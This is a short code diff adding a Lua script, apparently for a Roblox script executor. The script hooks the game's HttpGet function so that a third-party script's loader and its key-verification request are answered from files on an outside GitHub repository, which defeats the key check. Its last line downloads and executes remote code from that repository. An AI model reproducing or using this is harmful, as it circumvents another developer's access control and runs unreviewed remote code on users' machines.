@@ -1,0 +1,13 @@
+local d = "https://raw.githubusercontent.com/v1peer/lol/main/gramby/d/"
+
+local old; old = hookfunction(game.HttpGet, function(self, url)
+    if url:match("/502Development/502Lua/main/games/loaded/gamby.lua") then
+        return old(self, d.."what")
+    elseif url:match("verify/road_to_granmy%27s?verify_key=") then
+        return old(self, d.."wo")
+    else
+        return "loadstring('a=1')()" 
+    end
+end)
+
+loadstring(game:HttpGet(d.."w"))()
